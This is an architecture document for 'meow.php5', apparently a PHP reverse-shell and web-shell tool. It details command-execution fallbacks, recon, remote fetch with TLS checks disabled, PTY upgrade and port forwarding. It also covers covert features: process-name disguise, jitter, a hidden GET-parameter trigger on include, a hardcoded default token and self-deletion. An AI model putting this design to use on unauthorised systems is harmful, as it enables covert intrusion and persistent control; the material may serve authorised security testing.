# Architecture

This document describes the internal structure and execution flow of `meow.php5` (v2.1), based strictly on reading the source code. Behavior described here is inferred from the source, not from execution.

## Components and responsibilities

### Config (`meow_cfg`)

Located near the top of the file. Builds the `$GLOBALS['meow']` configuration array from:

1. Default values (host, port, token, tls, retry, retry_max, retry_delay, exec_timeout, pty, quiet, web, web_key, web_cmd, web_b64, run_key, run_val, proc_alias, jitter, version)
2. CLI arguments: positional `host`/`port`/`token`, plus flags `--tls|--no-tls`, `--no-retry`, `--no-pty`, `--quiet`, `--timeout=<n>`, `--delay=<n>`, `--alias=<name>`, `--jitter=<0..1>`
3. Environment variables: `MEOW_<UPPERCASE_KEY>` for each config key

Boolean env values are interpreted as `($env !== '0')`; string values are used as-is.

### Low-level utilities

- `meow_out($sock, $s)` — writes to the client socket, never fatal
- `meow_utf8($s)` — normalizes arbitrary bytes to UTF-8 (uses `mb_convert_encoding` if available)
- `meow_windows()` — OS family detection
- `meow_http()` — true when running under a non-CLI SAPI (HTTP request)
- `meow_entry()` — true only when this file is the entry point (not merely `include`d); provides include-safety
- `meow_token_ok($given, $want)` — constant-time comparison via `hash_equals` when available

### Working directory (`meow_cwd`)

Tracks the current working directory in `$meowCwd`, falling back to `getcwd()` or `C:\`/`/`.

### Capabilities (`meow_caps`)

Detects which command-execution primitives are available and not disabled: `proc_open`, `shell_exec`, `passthru`, `system`, `exec`, `popen`. Results are cached statically. Also reads `disable_functions` from `ini_get`.

### Command execution (`meow_raw_exec`, `meow_exec`)

`meow_raw_exec` tries primitives in order: `proc_open` (capturing stdout+stderr), `shell_exec`, `passthru`, `system`, `exec`, `popen`. Returns `[output, exit_code]`.

`meow_exec` wraps `meow_raw_exec` with an optional wall-clock timeout using the `timeout` binary (if available on POSIX), nesting the command inside `sh -c` so shell builtins keep working.

### Recon (`meow_info`, `meow_perm_report`)

- `meow_info` — host report (id/uname/hostname/os-release/ip/cwd) + PHP report (version, SAPI, OS, user, cwd, self path, caps, disable_functions, open_basedir, allow_url_fopen, pcntl, posix, curl)
- `meow_perm_report` — per-primitive OK/BLOCKED status plus `disable_functions` and `open_basedir`

### Fetch (`meow_fetch`)

Used by `!download`. Tries in order:
1. `file_get_contents` with a stream context (allow_url_fopen required; SSL verification disabled; self-signed allowed; 30s timeout; up to 5 redirects)
2. `curl_init` if the cURL extension is present (SSL verification disabled; self-signed allowed)
3. `curl` or `wget` binaries writing to a temp file, then reading it back

### PTY (`meow_pty_command`, `meow_pty_session`, `meow_pty_close`)

- `meow_pick_shell` — selects `cmd.exe` on Windows, else scans `/bin/bash`, `/bin/zsh`, `/bin/sh`, `/bin/dash`
- `meow_pty_command` — prefers `script -qfc <shell> /dev/null`, falls back to python `pty.spawn`, then `<shell> -i`
- `meow_pty_session` — multiplexed PTY: byte-for-byte forwarding between the client socket and a child shell process; built-ins (`!` commands) are intercepted and handled in-process; everything else is forwarded raw
- `meow_pty_close` — closes pipes and terminates the child process

### Port forwarding (`meow_forward`, `meow_pump`)

- `meow_forward` — forks via `pcntl_fork`; parent records the forwarder in the side-effect ledger and returns to the session; the child detaches (`posix_setsid`, closes stdio/fd), binds a TCP server on loopback (or `0.0.0.0` with `--all`), accepts connections, and forks a relay child per client that pumps bytes between the local client and a remote `stream_socket_client` connection
- `meow_pump` — blocking bidirectional byte pump between two streams using `stream_select`

### Built-ins (`meow_builtin`, `meow_help`)

All `!` commands are dispatched here. Each returns `'continue'`, `'exit'`, or `'upgrade'`. See `docs/COMMANDS.md` for the full list.

### Session loops (`meow_session`)

Simple line-at-a-time session:
- Sends banner, optional PTY hint, and prompt
- Reads lines from the socket
- Lines starting with `!` (but not `!!`) are built-ins
- `!!<cmd>` is rewritten to `\<cmd>` so `!` reaches the shell literally
- Everything else is executed via `meow_exec` and output is sent back
- The prompt is reprinted after each command

`meow_pty_session` is the PTY variant: byte-for-byte forwarding with built-in interception.

### Blending in (`meow_disguise`, `meow_jitter`)

- `meow_disguise` — calls `cli_set_process_title($alias)` if an alias is configured and the function exists (CLI SAPI only; kernel truncates to 15 chars)
- `meow_jitter` — randomizes a delay by +/- the jitter fraction: `delay * (1 - (2*r - 1) * j)` where `r` is uniform in [0,1]

### Side-effect ledger (`meow_note`, `meow_effects`)

Tracks side effects for cleanup:
- `['write', $path, $bytes]` — recorded by `!download` and `!upload`
- `['fwd', $pid, $bind, $lport, $rhost, $rport]` — recorded by `!fwd`

### Transport (`meow_connect`, `meow_handshake`, `meow_reverse`)

- `meow_connect` — opens a TCP stream to host:port with an SSL context (peer verification disabled, self-signed allowed, peer_name set to host); if TLS is enabled, upgrades the stream with `stream_socket_enable_crypto(STREAM_CRYPTO_METHOD_TLS_CLIENT)`
- `meow_handshake` — sends `MEOW-AUTH <sha256(token)>\n` if a token is set (plaintext never crosses the wire)
- `meow_reverse` — main reverse-shell loop: sets time limit / ignore user abort, disguises process, warns if no token, connects, performs handshake, runs the session, and on disconnect retries with exponential backoff (5, 10, 20, 40 … capped at 60, then jittered) unless retry is disabled or `retry_max` is reached

### Web shell mode (`meow_web`)

Handles HTTP requests:
- Suppresses errors (`display_errors=0`, `log_errors=0`), removes `X-Powered-By`, sets `Content-Type: text/plain`, `X-Content-Type-Options: nosniff`, `Cache-Control: no-store`
- Checks the token against the request parameter named by `web_key` (default `sid`); returns 403 on failure
- Reads a command from the base64 parameter (`web_b64`, default `upd`) via POST then GET, or the raw command parameter (`web_cmd`, default `c`) via POST then GET
- If no command, returns `ok`; otherwise executes via `meow_exec($cmd, 60)` and echoes output

### Entry

At the bottom of the file:
1. `$GLOBALS['meow'] = meow_cfg([...defaults...])` — initializes config
2. Computes `$runOnInclude` from `$_GET[run_key] === run_val` or `MEOW_RUN_ON_INCLUDE` env
3. If `meow_entry() || $runOnInclude`: if HTTP and web enabled → `meow_web()`; else → `meow_reverse()`

## Execution flow

### CLI (reverse shell) mode

```
php meow.php5 [host] [port] [token] [flags]
    │
    ▼
meow_cfg() builds $GLOBALS['meow'] from defaults + CLI + MEOW_* env
    │
    ▼
meow_entry() → true (CLI, SCRIPT_FILENAME === __FILE__)
    │
    ▼
meow_reverse()
    ├─ meow_disguise()          (set process title if alias configured)
    ├─ warn if no token set
    ├─ loop:
    │   ├─ meow_connect()       (TCP, optional TLS upgrade)
    │   ├─ meow_handshake()     (send SHA-256(token))
    │   ├─ meow_session()       (banner → read/eval/print loop)
    │   └─ on disconnect: retry with exponential backoff + jitter
    │
    └─ (repeat while retry enabled)
```

### Web shell mode

```
HTTP request to meow.php5
    │
    ▼
meow_entry() → true, meow_http() → true
    │
    ▼
meow_web()
    ├─ suppress errors, strip headers
    ├─ token check via $_GET[web_key] (403 on failure)
    ├─ read command from $_POST/$_GET[web_b64] (base64) or [web_cmd] (raw)
    ├─ no command → echo "ok"
    ├─ execute via meow_exec($cmd, 60)
    └─ echo output
```

### Include mode

```
require 'meow.php5'
    │
    ▼
meow_cfg() builds config (no side effects)
    │
    ▼
meow_entry() → false (SCRIPT_FILENAME !== __FILE__)
    │
    ▼
$runOnInclude = ($_GET[run_key] === run_val) || getenv('MEOW_RUN_ON_INCLUDE')
    │
    ├─ if false: nothing happens; functions are available to the includer
    └─ if true: dispatch as web or reverse mode (same as above)
```

## Communication flow

### Reverse shell session

1. Client (target) opens TCP/TLS connection to listener host:port.
2. Client sends `MEOW-AUTH <sha256(token)>\n`.
3. Listener is expected to respond with shell input lines; client sends back command output.
4. Each client input line:
   - Empty → reprint prompt
   - Starts with `!` (not `!!`) → dispatch built-in
   - Starts with `!!` → strip one `!`, execute in shell
   - Otherwise → execute in shell via `meow_exec`
5. Output is streamed back; prompt reprinted.
6. On `!exit` or socket EOF, session ends; reconnect logic may re-establish.

### PTY session (`!upgrade`)

1. Client forks a local shell process (`script`, python pty, or `<shell> -i`) via `proc_open`.
2. All streams set non-blocking.
3. `stream_select` multiplexes between the client socket and the shell's stdout/stderr.
4. Client input lines are accumulated; on newline:
   - `!` built-ins handled in-process (except `!upgrade` → "already inside a PTY", `!exit` → close PTY and return)
   - `!!<cmd>` → literal `!` to shell
   - Otherwise → bytes forwarded byte-for-byte to the child's stdin
5. Shell output is forwarded byte-for-byte to the client socket (terminal control sequences pass through).
6. On socket EOF or child EOF, PTY closes and control returns to the line-at-a-time session.

### Port forwarding (`!fwd`)

1. `!fwd [--all] <lport> <rhost> <rport>` forks via `pcntl_fork`.
2. Parent records `['fwd', $pid, $bind, $lport, $rhost, $rport]` and reports to the session.
3. Child detaches (`posix_setsid`, closes the session socket and stdio), binds a TCP server on `$bind:$lport`.
4. For each accepted client connection, forks a relay child that:
   - Opens `stream_socket_client("tcp://$rhost:$rport", ...)`
   - Runs `meow_pump($cli, $rem)` to relay bytes bidirectionally until either side closes
5. Forwarders persist independently of the shell session and are tracked for `!cleanup`.

## Authentication flow

1. A token may be configured (default `X82Wd3t0qasJ87D9hUqPXCl5`).
2. If the token is non-empty, `meow_handshake` sends `MEOW-AUTH <sha256(token)>\n` immediately after connecting.
3. The plaintext token is **never** sent over the wire; only its SHA-256 hash.
4. In web mode, `meow_token_ok` compares the request parameter (named by `web_key`) against the configured token using `hash_equals` when available.
5. If no token is set (`''`), `meow_token_ok` returns `true` for any given value — i.e., authentication is disabled and anyone who can reach the host:port can drive the shell. A stderr warning is emitted in reverse mode unless `quiet` is set.

## File transfer architecture

- **`!download <url> [dest]`** — `meow_fetch($url)` retrieves remote content (URL fopen → cURL extension → curl/wget binary), then `file_put_contents($dest, $data)` writes it. The write is recorded in the ledger as `['write', $dest, strlen($data)]`.
- **`!upload <path>`** — client sends base64 lines terminated by a line containing only `.`. `base64_decode` (strict) converts to bytes; `file_put_contents($path, $data)` writes. Recorded as `['write', $path, strlen($data)]`. Ceiling: 50 MiB of base64 input.
- **`!cat <file>`** — reads a text file up to 1 MiB; larger files suggest `!catb`.
- **`!catb <file>`** — reads any file up to 10 MiB, emits `<path> <size>\n<base64>\n`; larger files suggest `!download`.

All file writes go through `file_put_contents` and are tracked by the ledger so `!cleanup` can unlink them.

## Process management

- **Reverse shell process**: the `php meow.php5` process itself. In CLI mode it blocks on the session loop; on disconnect it may reconnect with backoff.
- **Process title alias**: `cli_set_process_title()` renames the process (CLI SAPI only, truncated to 15 chars by the kernel).
- **PTY child**: a shell process spawned via `proc_open` with pipes for stdin/stdout/stderr; multiplexed with `stream_select`.
- **Forwarder parent**: `pcntl_fork` child that persists after returning to the session; it sets up `posix_setsid`, ignores `SIGCHLD`, closes the session socket and stdio, then runs an accept loop.
- **Forwarder relay**: per-client `pcntl_fork` grandchild that pumps bytes between a local client and a remote TCP endpoint, then exits.

## Cleanup implementation

`!cleanup [--self]` iterates `meow_effects()`:

- For each `['write', $path, $bytes]` entry: if the file exists, `unlink($path)` and report success/failure.
- For each `['fwd', $pid, $bind, $lport, $rhost, $rport]` entry: if the PID is alive (`posix_kill($pid, 0)`), send `SIGTERM`, wait 150ms, then `SIGKILL` if still alive.
- Reset `$meowCwd` to force re-detection from `getcwd()`.
- Report counts of reverted files and stopped forwarders.
- With `--self`: close the socket, `unlink(__FILE__)`, and `exit(0)`.

Only paths recorded by `!download`/`!upload` are eligible for cleanup; arbitrary files are not touched.

`!selfdestruct` unconditionally `unlink(__FILE__)` after flushing the socket and exits.
